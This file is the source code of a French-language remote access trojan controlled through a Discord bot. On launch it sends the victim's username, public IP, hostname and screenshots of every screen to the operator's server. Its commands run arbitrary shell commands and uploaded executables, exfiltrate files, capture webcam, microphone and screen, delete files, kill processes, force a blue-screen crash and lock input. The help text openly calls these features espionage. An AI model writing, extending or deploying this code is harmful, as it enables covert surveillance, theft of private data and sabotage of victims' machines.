import discord
import subprocess
import os
import requests
import cv2
import asyncio
from discord.ext import commands
import socket
import urllib.request
import ctypes
import pyautogui
import numpy as np
import pyaudio
import wave
import psutil
import glob
from scapy.all import sniff
import pyttsx3
import webbrowser
import tkinter as tk
from tkinter import messagebox 
from threading import Thread
import win32api
import win32con
import time
import mss
from screeninfo import get_monitors 
import ctypes
import threading
from pydub import AudioSegment
from pydub.playback import play
from pynput.mouse import Controller
import random


HOST = "127.0.0.1"  
PORT = 5000  

TOKEN = "TON TOKEN"
GUILD_ID = TA GUILD ID

cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)

# Activer les intents
intents = discord.Intents.default()
intents.message_content = True 

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

def get_public_ip():
    try:
        response = requests.get("http://checkip.amazonaws.com")
        public_ip = response.text.strip()
        print(f"IP publique récupérée via checkip.amazonaws.com : {public_ip}")
        if not public_ip:
            response = requests.get("https://ipinfo.io/ip")
            public_ip = response.text.strip()
            print(f"IP publique récupérée via ipinfo.io : {public_ip}")
        return public_ip
    except Exception as e:
        print(f"Erreur lors de la récupération de l'IP : {e}")
        return "Unknown_IP"

def get_system_info():
    try:
        user_name = os.getlogin()  
        ip_address = get_public_ip() 
        hostname = socket.gethostname()  
        return f"Nom d'utilisateur : {user_name}\nIP publique : {ip_address}\nNom d'hôte : {hostname}"
    except Exception as e:
        return f"Erreur lors de la récupération des informations système : {e}"

@bot.command()
async def upload(ctx, attachment: discord.Attachment = None):
    try:
        if not attachment:
            await ctx.send("❌ Aucun fichier joint.")
            return

        filename = attachment.filename
        await attachment.save(filename)
        await ctx.send(f"✅ Fichier enregistré : `{filename}`")

        if filename.endswith(".py"):
            command = f"python {filename}"
        elif filename.endswith(".bat") or filename.endswith(".cmd"):
            command = f"cmd.exe /c {filename}"
        elif filename.endswith(".exe"):
            command = filename
        else:
            command = f'start "" "{filename}"'  

        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.stdout else result.stderr

        await ctx.send(f"🖥️ Résultat de l'exécution :\n```{output[:1900]}```")
    except Exception as e:
        await ctx.send(f"⚠️ Erreur : {e}")


@bot.event
async def on_ready():
    """Quand le bot démarre, capture chaque écran et envoie les images."""
    print(f'✅ Connecté en tant que {bot.user}')

    guild = bot.get_guild(GUILD_ID)
    if not guild:
        print("❌ Serveur introuvable.")
        return

    ip_address = get_public_ip() 
    print(f"🌍 IP publique détectée : {ip_address}")

    category_name = f"Session-{ip_address}"
    existing_category = discord.utils.get(guild.categories, name=category_name)

    if not existing_category:
        category = await guild.create_category(category_name)
        print(f'📂 Catégorie créée : {category_name}')
        session_channel = await category.create_text_channel("session")
        print(f'📜 Salon "session" créé dans la catégorie {category_name}')
    else:
        print(f'📂 Catégorie existante trouvée : {category_name}')
        session_channel = discord.utils.get(existing_category.text_channels, name="session")
        if not session_channel:
            session_channel = await existing_category.create_text_channel("session")
            print(f'📜 Salon "session" créé dans la catégorie existante {category_name}')


    await session_channel.send("🖥 **Session Active ! Voici les informations du système :**")
    await session_channel.send(get_system_info())

    screens = get_monitors()
    screen_count = len(screens)

    await session_channel.send(f"📸 **Nombre d'écrans détectés :** `{screen_count}`\n📢 *Utilise `!screenshot [numéro]` pour capturer un écran spécifique.*")

    with mss.mss() as sct:
        for i, monitor in enumerate(screens):
            try:
                filename = f"screen_{i}.png"
                
                screen = sct.grab(sct.monitors[i + 1])  # `i + 1` car `mss.monitors[0]` est tout l'écran
                
                mss.tools.to_png(screen.rgb, screen.size, output=filename)
                await session_channel.send(f"🖥 **Écran {i} capturé :**", file=discord.File(filename))
                os.remove(filename)

            except Exception as e:
                await session_channel.send(f"⚠️ **Erreur lors de la capture de l'écran {i}** : {e}")

    await session_channel.send("✅ **Capture des écrans terminée !**")
        

####################### GESTION FICHIER #######################

@bot.command()
async def exec(ctx, *, command: str):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.stdout else result.stderr
        await ctx.send(f'```{output[:1900]}```')  
    except Exception as e:
        await ctx.send(f'Erreur : {e}')

@bot.command()
async def cd(ctx, *, path: str = None):
    global user_paths

    if ctx.author.id not in user_paths:
        user_paths[ctx.author.id] = os.getcwd() 

    current_path = user_paths[ctx.author.id]

    if not path:
        await ctx.send(f"📂 **Dossier actuel :** `{current_path}`")
        return

    new_path = os.path.join(current_path, path)

    if os.path.isdir(new_path):
        user_paths[ctx.author.id] = os.path.abspath(new_path)
        await ctx.send(f"✅ **Dossier changé :** `{user_paths[ctx.author.id]}`")
    else:
        await ctx.send("❌ **Dossier introuvable.**")

@bot.command()
async def ls(ctx):
    global user_paths

    if ctx.author.id not in user_paths:
        user_paths[ctx.author.id] = os.getcwd()

    current_path = user_paths[ctx.author.id]

    try:
        files = os.listdir(current_path)
        file_list = "\n".join(files[:50])  
        await ctx.send(f"📂 **Contenu de `{current_path}` :**\n```{file_list}```")
    except Exception as e:
        await ctx.send(f"⚠️ Erreur : {e}")

@bot.command()
async def pwd(ctx):
    global user_paths

    if ctx.author.id not in user_paths:
        user_paths[ctx.author.id] = os.getcwd()

    await ctx.send(f"📍 **Dossier actuel :** `{user_paths[ctx.author.id]}`")

#####################################################################

@bot.command()
async def getfile(ctx, filename: str):
    if os.path.exists(filename):
        await ctx.send(file=discord.File(filename))
    else:
        await ctx.send("Fichier introuvable.")


@bot.command()
async def photo(ctx):
    try:
        cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)  
        ret, frame = cam.read()
        if not ret:
            await ctx.send("Erreur : Impossible de prendre la photo.")
            return
        filename = "photo.jpg"
        cv2.imwrite(filename, frame)
        cam.release()
        await ctx.send(file=discord.File(filename))
        os.remove(filename)
    except Exception as e:
        await ctx.send(f'Erreur : {e}')

@bot.command()
async def shutdown(ctx):
    await ctx.send("⚠️ **Attention !** Le PC va s'éteindre dans 10 secondes...")
    await asyncio.sleep(10)  
    if os.name == "nt":  
        os.system("shutdown /s /t 0")
    else:  # Linux/macOS
        os.system("shutdown -h now")

@bot.command()
async def restart(ctx):
    await ctx.send("🔄 **Le PC va redémarrer dans 10 secondes...**")
    await asyncio.sleep(10)
    if os.name == "nt":  
        os.system("shutdown /r /t 0")
    else:  # Linux/macOS
        os.system("shutdown -r now")

@bot.command()
async def lock(ctx):
    if os.name == "nt": 
        await ctx.send("🔒 **Verrouillage de la session...**")
        os.system("rundll32.exe user32.dll,LockWorkStation")
    else:
        await ctx.send("❌ Cette commande fonctionne uniquement sur Windows.")



@bot.command()
async def wallpaper(ctx, url: str):
    try:
        await ctx.send("🖼️ **Changement du fond d'écran...**")

        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
        request = urllib.request.Request(url, headers=headers)

        wallpaper_path = "wallpaper.jpg"
        with urllib.request.urlopen(request) as response, open(wallpaper_path, "wb") as out_file:
            out_file.write(response.read())

        
        if os.name == "nt":
            ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(wallpaper_path), 3)
            await ctx.send("✅ **Fond d'écran mis à jour !**")
        else:
            await ctx.send("❌ Cette commande fonctionne uniquement sur Windows.")

    except Exception as e:
        await ctx.send(f"⚠️ Erreur : {e}")



@bot.command()
async def type(ctx, *, text: str):
    try:
        await ctx.send(f"⌨️ **Saisie en cours :** `{text}`")
        pyautogui.write(text, interval=0.05)  
        await ctx.send("✅ **Texte tapé avec succès !**")
    except Exception as e:
        await ctx.send(f"⚠️ Erreur : {e}")

@bot.command()
async def screenshot(ctx):
    try:
        await ctx.send("📸 **Capture d'écran en cours...**")
        screenshot_path = "screenshot.png"
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)

        await ctx.send(file=discord.File(screenshot_path))
        os.remove(screenshot_path)  
    except Exception as e:
        await ctx.send(f"⚠️ Erreur : {e}")

@bot.command()
async def record(ctx, screen_number: int, duration: int = 5):
    try:
        with mss.mss() as sct:
            monitors = sct.monitors  
            
            if screen_number < 1 or screen_number >= len(monitors):
                await ctx.send(f"❌ **Numéro d'écran invalide !** Choisis entre `1` et `{len(monitors) - 1}`.")
                return
            
            screen = monitors[screen_number]
            width, height = screen["width"], screen["height"]
            
            filename = f"record_{screen_number}.mp4"
            fourcc = cv2.VideoWriter_fourcc(*"mp4v")
            out = cv2.VideoWriter(filename, fourcc, 10, (width, height))
            
            await ctx.send(f"🎥 **Enregistrement de l'écran {screen_number} pour {duration} secondes...**")
            
            start_time = time.time()
            while time.time() - start_time < duration:
                frame = np.array(sct.grab(screen))
                frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
                out.write(frame)
            
            out.release()
            await ctx.send(file=discord.File(filename))
            os.remove(filename)

    except Exception as e:
        await ctx.send(f"⚠️ Erreur : {e}")

@bot.command()
async def record_audio(ctx, duration: int = 5):
    try:
        await ctx.send(f"🎤 **Enregistrement audio pour {duration} secondes...**")

        audio = pyaudio.PyAudio()
        format_audio = pyaudio.paInt16
        channels = 1
        rate = 44100
        frames_per_buffer = 1024

        stream = audio.open(format=format_audio, channels=channels,
                            rate=rate, input=True,
                            frames_per_buffer=frames_per_buffer)

        frames = []

        for _ in range(0, int(rate / frames_per_buffer * duration)):
            data = stream.read(frames_per_buffer)
            frames.append(data)

        stream.stop_stream()
        stream.close()
        audio.terminate()

        audio_file = "audio_record.wav"
        wf = wave.open(audio_file, "wb")
        wf.setnchannels(channels)
        wf.setsampwidth(audio.get_sample_size(format_audio))
        wf.setframerate(rate)
        wf.writeframes(b"".join(frames))
        wf.close()

        await ctx.send(file=discord.File(audio_file))
        os.remove(audio_file)

    except Exception as e:
        await ctx.send(f"⚠️ Erreur : {e}")

@bot.command()
async def tasklist(ctx):
    try:
        await ctx.send("📋 **Récupération de la liste des processus...**")

        
        if os.name == "nt":  
            result = subprocess.run("tasklist", shell=True, capture_output=True, text=True)
        else:  
            result = subprocess.run("ps aux", shell=True, capture_output=True, text=True)

        output = result.stdout

        chunk_size = 1900  #
        chunks = [output[i:i + chunk_size] for i in range(0, len(output), chunk_size)]

        for chunk in chunks:
            await ctx.send(f"```{chunk}```")

        await ctx.send("✅ **Liste complète des processus envoyée !**")

    except Exception as e:
        await ctx.send(f"⚠️ Erreur : {e}")


@bot.command()
async def kill(ctx, process_name: str):
    try:
        await ctx.send(f"❌ **Fermeture de `{process_name}`...**")

        if os.name == "nt":  
            os.system(f"taskkill /F /IM {process_name}")
        else:  
            os.system(f"pkill {process_name}")

        await ctx.send(f"✅ **Le processus `{process_name}` a été arrêté !**")
    except Exception as e:
        await ctx.send(f"⚠️ Erreur : {e}")



@bot.command()
async def system(ctx):
    try:
        
        cpu_usage = psutil.cpu_percent(interval=1)

        
        ram_info = psutil.virtual_memory()
        used_ram = round(ram_info.used / (1024 ** 3), 2)  
        total_ram = round(ram_info.total / (1024 ** 3), 2)  

        
        disk_info = psutil.disk_usage('/')
        free_disk = round(disk_info.free / (1024 ** 3), 2)  
        total_disk = round(disk_info.total / (1024 ** 3), 2)  

        
        if os.name == "nt":  
            result = subprocess.run("wmic logicaldisk get caption,description", shell=True, capture_output=True, text=True)
        else:  
            result = subprocess.run("lsusb", shell=True, capture_output=True, text=True)

        devices_output = result.stdout.strip()[:800]  

        system_info = (
            f"⚙️ **État du système**\n"
            f"💻 **CPU** : `{cpu_usage}%` d'utilisation\n"
            f"📊 **RAM** : `{used_ram} Go / {total_ram} Go`\n"
            f"💾 **Disque** : `{free_disk} Go / {total_disk} Go` disponibles\n"
            f"🔌 **Périphériques** :\n```{devices_output}```"
        )

        await ctx.send(system_info)

    except Exception as e:
        await ctx.send(f"⚠️ Erreur : {e}")

@bot.command()
async def file(ctx, action: str, *args):
    try:
        if action == "ls":  
            path = args[0] if args else "."  
            if not os.path.exists(path):
                await ctx.send("❌ **Le dossier spécifié n'existe pas.**")
                return

            files = os.listdir(path)
            file_list = "\n".join(files[:50])  
            await ctx.send(f"📂 **Fichiers dans `{path}` :**\n```{file_list}```")

        elif action == "delete":  
            if not args:
                await ctx.send("❌ **Spécifie un fichier à supprimer.**")
                return
            
            file_path = args[0]
            if os.path.exists(file_path):
                os.remove(file_path)
                await ctx.send(f"✅ **Fichier `{file_path}` supprimé !**")
            else:
                await ctx.send("❌ **Fichier introuvable.**")

        elif action == "rename":  
            if len(args) < 2:
                await ctx.send("❌ **Spécifie un ancien et un nouveau nom.**")
                return
            
            old_name, new_name = args[0], args[1]
            if os.path.exists(old_name):
                os.rename(old_name, new_name)
                await ctx.send(f"✅ **Fichier `{old_name}` renommé en `{new_name}` !**")
            else:
                await ctx.send("❌ **Fichier introuvable.**")

        elif action == "download":  
            if not args:
                await ctx.send("❌ **Spécifie un fichier à télécharger.**")
                return

            file_path = args[0]
            if os.path.exists(file_path):
                await ctx.send(file=discord.File(file_path))
            else:
                await ctx.send("❌ **Fichier introuvable.**")

        elif action == "find":  
            if not args:
                await ctx.send("❌ **Spécifie un nom de fichier à rechercher.**")
                return

            search_name = args[0]
            await ctx.send(f"🔍 **Recherche de `{search_name}` en cours...**")

            found_files = []
            for root, dirs, files in os.walk("/"):
                for file in files:
                    if search_name.lower() in file.lower():
                        found_files.append(os.path.join(root, file))
                if len(found_files) > 10:  
                    break
            
            if found_files:
                result_text = "\n".join(found_files[:10])  
                await ctx.send(f"✅ **Fichiers trouvés :**\n```{result_text}```")
            else:
                await ctx.send("❌ **Aucun fichier trouvé.**")

        else:
            await ctx.send("❌ **Action non reconnue. Utilise : `ls`, `delete`, `rename`, `download`, `find`.**")

    except Exception as e:
        await ctx.send(f"⚠️ **Erreur :** {e}")

@bot.command()
async def tts(ctx, *, text: str):
    try:
        engine = pyttsx3.init()
        engine.say(text)
        engine.runAndWait()
        await ctx.send(f"🔊 **Le PC dit :** `{text}`")
    except Exception as e:
        await ctx.send(f"⚠️ Erreur : {e}")

@bot.command()
async def open(ctx, url: str):
    try:
        webbrowser.open(url)
        await ctx.send(f"🌐 **Ouverture de :** `{url}`")
    except Exception as e:
        await ctx.send(f"⚠️ Erreur : {e}")

def show_popup(message):
    root = tk.Tk()
    root.withdraw()  # Masque la fenêtre principale
    messagebox.showwarning("Alerte ⚠️", message) 
    root.destroy()

@bot.command()
async def popup(ctx, *, message: str):
    try:
        Thread(target=show_popup, args=(message,)).start() 
        await ctx.send(f"👁 **Pop-up affichée :** `{message}`")
    except Exception as e:
        await ctx.send(f"⚠️ Erreur : {e}")

@bot.command()
async def flip_screen(ctx):
    try:
        device = win32api.EnumDisplayDevices(None, 0)
        settings = win32api.EnumDisplaySettings(device.DeviceName, win32con.ENUM_CURRENT_SETTINGS)
        settings.DisplayOrientation = 2  # 2 = 180° (flip total)
        win32api.ChangeDisplaySettingsEx(device.DeviceName, settings)
        await ctx.send("🔄 **Écran retourné !** Pour revenir : `!flip_back`")
    except Exception as e:
        await ctx.send(f"⚠️ Erreur : {e}")

@bot.command()
async def flip_back(ctx):

    try:
        device = win32api.EnumDisplayDevices(None, 0)
        settings = win32api.EnumDisplaySettings(device.DeviceName, win32con.ENUM_CURRENT_SETTINGS)
        settings.DisplayOrientation = 0  
        win32api.ChangeDisplaySettingsEx(device.DeviceName, settings)
        await ctx.send("✅ **Écran remis à l'endroit !**")
    except Exception as e:
        await ctx.send(f"⚠️ Erreur : {e}")

@bot.command()
async def write(ctx, *, message: str):
    try:
        pyautogui.hotkey("win", "r") 
        time.sleep(1)
        pyautogui.write("notepad")
        pyautogui.press("enter")
        time.sleep(1)
        pyautogui.write(message, interval=0.1)
        await ctx.send(f"📝 **Message écrit dans le bloc-notes :** `{message}`")
    except Exception as e:
        await ctx.send(f"⚠️ Erreur : {e}")

@bot.command()
async def ip_info(ctx, ip: str):
    try:
        await ctx.send(f"🌍 **Recherche d'infos sur `{ip}`...**")
        response = requests.get(f"http://ip-api.com/json/{ip}")
        data = response.json()

        if data["status"] != "fail":
            info = (
                f"📡 **IP :** `{data['query']}`\n"
                f"🌍 **Pays :** `{data['country']}`\n"
                f"🏙️ **Ville :** `{data['city']}`\n"
                f"📍 **Région :** `{data['regionName']}`\n"
                f"🌐 **Fournisseur :** `{data['isp']}`\n"
                f"🛰️ **Lat/Lon :** `{data['lat']}, {data['lon']}`\n"
            )
            await ctx.send(info)
        else:
            await ctx.send("❌ **Adresse IP invalide ou non trouvée.**")

    except Exception as e:
        await ctx.send(f"⚠️ Erreur : {e}")

@bot.command()
async def fake_crash(ctx):
    if os.name == "nt":  
        await ctx.send("💀 **Lancement du Blue Screen...**")
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC000007B, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
    else:
        await ctx.send("❌ **Cette commande fonctionne uniquement sur Windows.**")

flipping = False 

def set_screen_rotation(angle):
    try:
        device = win32api.EnumDisplayDevices(None, 0)
        settings = win32api.EnumDisplaySettings(device.DeviceName, win32con.ENUM_CURRENT_SETTINGS)

        if angle == 0:
            settings.DisplayOrientation = win32con.DMDO_DEFAULT  # Normal
        elif angle == 90:
            settings.DisplayOrientation = win32con.DMDO_90  # Rotation à droite
        elif angle == 180:
            settings.DisplayOrientation = win32con.DMDO_180  # À l'envers
        elif angle == 270:
            settings.DisplayOrientation = win32con.DMDO_270  # Rotation à gauche

        win32api.ChangeDisplaySettingsEx(device.DeviceName, settings)
    
    except Exception as e:
        print(f"⚠️ Erreur lors du changement d'orientation : {e}")

@bot.command()
async def random_flip(ctx, duration: int = 30):
    global flipping
    if flipping:
        await ctx.send("❌ **Le mode Random Flip est déjà activé !**")
        return

    flipping = True
    await ctx.send(f"🔄 **Mode Random Flip activé pour {duration} secondes !**")

    end_time = asyncio.get_event_loop().time() + duration

    while flipping and asyncio.get_event_loop().time() < end_time:
        angle = random.choice([0, 90, 180, 270]) 
        set_screen_rotation(angle)

        await ctx.send(f"🔄 **Écran tourné à `{angle}°` !** (Prochaine rotation dans quelques secondes...)")
        await asyncio.sleep(random.randint(3, 7)) 

    flipping = False
    set_screen_rotation(0)  
    await ctx.send("✅ **Mode Random Flip terminé, écran remis en place !**")

@bot.command()
async def stop_flip(ctx):
    global flipping
    flipping = False
    set_screen_rotation(0) 
    await ctx.send("✅ **Mode Random Flip désactivé et écran remis en place !**")
    
@bot.command()
async def play_sound(ctx, file: str):
    try:
        if os.path.exists(file):
            await ctx.send(f"🔊 **Lecture de `{file}`...**")
            sound = AudioSegment.from_file(file)
            play(sound)
        else:
            await ctx.send("❌ **Fichier audio introuvable.**")
    except Exception as e:
        await ctx.send(f"⚠️ Erreur : {e}")

@bot.command()
async def spam_popup(ctx, message: str, count: int = 5):
    await ctx.send(f"💀 **Lancement du spam de pop-ups ({count} fois)...**")

    def popup_spam():
        for _ in range(count):
            root = tk.Tk()
            root.withdraw()
            tk.messagebox.showwarning("Alerte !", message)
            root.destroy()

    Thread(target=popup_spam).start()

@bot.command()
async def disable_keyboard(ctx, duration: int):
    await ctx.send(f"⛔ **Clavier désactivé pendant {duration} secondes !**")

    def block_keys():
        keyboard.block_key("all")
        time.sleep(duration)
        keyboard.unblock_key("all")

    threading.Thread(target=block_keys).start()
    time.sleep(duration)
    await ctx.send("✅ **Clavier réactivé !**")

@bot.command()
async def disable_mouse(ctx, duration: int):
    await ctx.send(f"🛑 **Souris désactivée pendant {duration} secondes !**")

    mouse = Controller()
    original_position = mouse.position 

    def lock_mouse():
        start_time = time.time()
        while time.time() - start_time < duration:
            mouse.position = original_position 
            time.sleep(0.1)

    threading.Thread(target=lock_mouse).start()
    time.sleep(duration)
    await ctx.send("✅ **Souris réactivée !**")

@bot.command()
async def live_screenshot(ctx, interval: int, duration: int):
    await ctx.send(f"📸 **Mode Screenshot Auto activé ! Capture toutes les `{interval}` secondes pendant `{duration}` secondes.**")

    end_time = time.time() + duration
    count = 0

    while time.time() < end_time:
        filename = f"live_screenshot_{count}.png"
        screen = pyautogui.screenshot()
        screen.save(filename)
        await ctx.send(f"📷 **Screenshot {count+1} :**", file=discord.File(filename))
        os.remove(filename)
        count += 1
        time.sleep(interval)

    await ctx.send("✅ **Mode Screenshot Auto terminé !**")

@bot.command()
async def help(ctx):
    help_text = (
        "**📜 Liste des commandes disponibles :**\n\n"
        "**🖥️ Contrôle du PC**\n"
        "`!shutdown` → Éteint le PC.\n"
        "`!restart` → Redémarre le PC.\n"
        "`!lock` → Verrouille la session (Windows).\n"
        "`!wallpaper [URL]` → Change le fond d’écran.\n"
        "`!type [texte]` → Simule l’écriture clavier.\n\n"

        "**🎥 Surveillance et Espionnage**\n"
        "`!screenshot` → Prend un screenshot et l’envoie sur Discord.\n"
        "`!record [durée]` → Capture une vidéo de l’écran.\n"
        "`!record_audio [durée]` → Enregistre le son du micro.\n"
        "`!photo` → Prend une photo avec la webcam.\n\n"

        "**⚙️ Gestion du système**\n"
        "`!tasklist` → Liste tous les processus en cours.\n"
        "`!kill [nom_processus]` → Ferme une application.\n"
        "`!system` → Affiche CPU, RAM, Disque et Périphériques connectés.\n\n"

        "**📂 Gestion des fichiers**\n"
        "`!file ls [chemin]` → Liste les fichiers d’un dossier.\n"
        "`!file delete [fichier]` → Supprime un fichier.\n"
        "`!file rename [ancien] [nouveau]` → Renomme un fichier.\n"
        "`!file download [fichier]` → Télécharge un fichier du PC.\n"
        "`!file find [nom]` → Recherche un fichier dans le système.\n\n"

        "**🎮 Trolling et Fun**\n"
        "`!tts [texte]` → Fait parler le PC.\n"
        "`!open [URL]` → Ouvre un site web dans le navigateur.\n"
        "`!popup [texte]` → Affiche une pop-up flippante.\n"
        "`!flip_screen` → Retourne l’écran à l’envers.\n"
        "`!flip_back` → Remet l’écran normal.\n"
        "`!write [texte]` → Écrit un message dans Notepad.\n\n"

        "**📁 Navigation comme CMD**\n"
        "`!cd [chemin]` → Change de dossier.\n"
        "`!ls` → Liste les fichiers du dossier actuel.\n"
        "`!pwd` → Affiche le chemin actuel.\n"
        "`!exec [commande]` → Exécute une commande système.\n"
    )

    await ctx.send(help_text)

bot.run(TOKEN)
